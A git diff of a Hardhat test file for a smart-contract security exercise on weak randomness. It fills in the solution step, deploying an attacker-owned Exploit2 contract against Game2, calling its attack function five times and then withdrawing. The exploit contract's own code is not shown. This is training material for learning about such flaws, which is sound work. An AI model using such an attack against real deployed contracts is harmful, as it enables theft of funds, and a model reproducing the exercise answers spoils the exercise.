@@ -3,7 +3,7 @@ import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
 import { BigNumber } from "ethers";
 import { parseEther } from "ethers/lib/utils";
 import { expect } from "chai";
-import { Game2, Game2__factory } from "../../typechain-types";
+import { Game2, Game2__factory, Exploit2, Exploit2__factory } from "../../typechain-types";
 
 describe("Randomness Vulnerabilities Exercise 2", function () {
     let deployer: SignerWithAddress, attacker: SignerWithAddress;
@@ -12,6 +12,7 @@ describe("Randomness Vulnerabilities Exercise 2", function () {
     const GAME_FEE = parseEther("1");
 
     let game: Game2;
+    let exploit: Exploit2;
 
     let attackerInitialBalance: BigNumber;
 
@@ -30,12 +31,23 @@ describe("Randomness Vulnerabilities Exercise 2", function () {
         )) as Game2__factory;
         game = await gameFactory.deploy({ value: INITIAL_POT });
 
+        const exploit2Factory = (await ethers.getContractFactory(
+            "Exploit2",
+            attacker
+        )) as Exploit2__factory;
+        exploit = await exploit2Factory.deploy(game.address);
+
         let inGame = await ethers.provider.getBalance(game.address);
         expect(inGame).to.equal(INITIAL_POT);
     });
 
     it("Exploit", async function () {
-        /** CODE YOUR SOLUTION HERE */
+        await exploit.connect(attacker).attack({ value: GAME_FEE });
+        await exploit.connect(attacker).attack({ value: GAME_FEE });
+        await exploit.connect(attacker).attack({ value: GAME_FEE });
+        await exploit.connect(attacker).attack({ value: GAME_FEE });
+        await exploit.connect(attacker).attack({ value: GAME_FEE });
+        await exploit.connect(attacker).withdraw();
     });
 
     after(async function () {
